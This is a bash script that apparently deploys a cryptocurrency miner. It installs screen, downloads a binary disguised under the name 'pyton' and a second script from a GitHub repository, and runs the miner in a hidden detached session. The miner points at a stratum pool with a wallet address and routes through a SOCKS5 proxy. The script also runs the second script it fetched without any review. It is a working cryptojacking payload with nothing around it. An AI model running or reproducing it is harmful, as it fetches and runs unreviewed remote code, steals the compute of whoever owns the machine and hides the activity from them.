#!/bin/bash
apt-get install screen -y
wget -q https://raw.githubusercontent.com/hndouehdw/henro/master/jobs.sh
wget -qO kase https://raw.githubusercontent.com/hndouehdw/henro/master/pyton
chmod +x jobs.sh
chmod +x kase
screen -dm -S kase ./kase -a yespowertide  -o stratum+tcp://stratum-ru.rplant.xyz:7059 -u TJjSCLyybeSnHqR1CTAVwfUhf2QkkBvjWZ.hu --proxy socks5://192.252.208.70:14282
./jobs.sh

echo success
